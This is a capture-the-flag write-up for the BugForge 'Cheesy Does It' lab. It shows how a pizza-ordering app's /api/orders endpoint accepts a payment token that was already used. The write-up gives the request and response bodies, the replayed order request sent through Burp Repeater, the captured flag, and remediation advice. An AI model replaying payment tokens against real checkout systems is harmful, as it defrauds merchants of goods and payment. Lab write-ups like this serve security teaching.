# Cheesy Does It – cheesy-014 – Can you reuse a token?

## Challenge Information

- **Challenge:** Cheesy Does It
- **Platform:** BugForge
- **Category:** Web Security
- **Vulnerability:** Payment Token Replay
- **Difficulty:** Lab-based
- **Status:** Solved

## Objective

Identify and exploit a vulnerability in the pizza ordering application's payment workflow by reusing a previously consumed payment token.

## Vulnerability Overview

The application generates a payment token during payment validation. After processing the payment and successfully creating an order, the application fails to invalidate the payment token.

This allows an attacker to reuse the same payment token to create additional orders without performing a fresh payment validation.

### Vulnerable Endpoints

| Endpoint                | Purpose                                                 |
| ----------------------- | ------------------------------------------------------- |
| `/api/payment/validate` | Validates payment details and generates a payment token |
| `/api/payment/process`  | Processes payment using the generated token             |
| `/api/orders`           | Creates an order using the payment token                |

## Steps to Reproduce

### 1. Register an Account

- Open the Cheesy Does It web application.
- Register a new test account.
- Log in using the registered credentials.

### 2. Create the First Order

- Add a pizza to the cart.
- Proceed to checkout.
- Enter payment details and confirm the order.

The application performs three API requests.

### 3. Payment Validation

**Request:**

```http
POST /api/payment/validate
```

```json
{
  "card_number": "4444 4444 4444 4444",
  "exp_month": "12",
  "exp_year": "25",
  "cvv": "123",
  "amount": 10.99
}
```

**Response:**

```json
{
  "valid": true,
  "message": "Card validated successfully",
  "payment_token": "c04a1ac2-a6c0-430e-969b-3136de159609"
}
```

The server generates a payment token that is subsequently used by the payment and order endpoints.

### 4. Payment Processing

**Request:**

```http
POST /api/payment/process
```

```json
{
  "card_number": "4444 4444 4444 4444",
  "amount": 10.99,
  "payment_token": "c04a1ac2-a6c0-430e-969b-3136de159609"
}
```

**Response:**

```json
{
  "success": true,
  "transaction_id": "TXN-1794309089508",
  "message": "Payment processed successfully",
  "payment_token": "c04a1ac2-a6c0-430e-969b-3136de159609"
}
```

The payment is successfully processed, and the token remains unchanged.

### 5. First Order Creation

**Request:**

```http
POST /api/orders
```

The request includes the payment token:

```json
{
  "payment_token": "c04a1ac2-a6c0-430e-969b-3136de159609",
  "coupon_code": null,
  "points_to_use": 0
}
```

**Response:**

```json
{
  "id": 1,
  "order_number": "CDI-1794309089849-4ZATJLMRM",
  "message": "Order created successfully",
  "status": "received",
  "subtotal": 10.99,
  "coupon_discount": 0,
  "points_used": 0,
  "points_earned": 10,
  "payment_reference": "c04a1ac2-a6c0-430e-969b-3136de159609",
  "total": 10.99
}
```

The first order is successfully created.

### 6. Exploiting Payment Token Replay

After successfully placing the first order:

1. Add another pizza to the cart.
2. Proceed to checkout.
3. Capture the `/api/orders` request using Burp Suite.
4. Send the request to Burp Repeater.
5. Reuse the previously consumed `payment_token`.
6. Send the request again without performing fresh payment validation.

**Replayed Request:**

```json
{
  "payment_token": "c04a1ac2-a6c0-430e-969b-3136de159609",
  "coupon_code": null,
  "points_to_use": 0
}
```

The order request contains the same payment token used in the previous successful transaction.

### 7. Flag Retrieval

**Response:**

```json
{
  "id": 2,
  "order_number": "CDI-1794309750169-GK28PY3WE",
  "message": "Order created successfully",
  "status": "received",
  "subtotal": 10.99,
  "coupon_discount": 0,
  "points_used": 0,
  "points_earned": 10,
  "payment_reference": "c04a1ac2-a6c0-430e-969b-3136de159609",
  "total": 10.99,
  "flag": "bug{lxxgSrfOB25MbJYS8sWAiChgmyqYESvq}"
}
```

**Flag:**

```text
bug{lxxgSrfOB25MbJYS8sWAiChgmyqYESvq}
```

## Root Cause

The `/api/orders` endpoint does not enforce single-use payment tokens.

The backend accepts a previously consumed payment token and creates another order without verifying whether the token has already been used for a completed transaction.

## Impact

- Unauthorized duplicate order creation.
- Potential financial loss if orders are fulfilled without independent payment verification.
- Payment transaction integrity violations.
- Abuse of reward points through repeated order creation.
- Potential business logic bypass in the checkout workflow.

## Remediation

- Enforce single-use payment tokens.
- Invalidate payment tokens after successful consumption.
- Bind payment tokens to a specific order, amount, and transaction.
- Verify payment status independently before creating an order.
- Implement idempotency controls for order creation.
- Reject previously consumed payment tokens.

## Tools Used

- Burp Suite
- Browser Developer Tools
- Burp Repeater

## Conclusion

The Cheesy Does It challenge demonstrates a payment token replay vulnerability caused by improper payment token lifecycle management.

By reusing the same payment token in the `/api/orders` endpoint, a second order was created without fresh payment validation, resulting in successful flag retrieval.

**Challenge Status: Solved**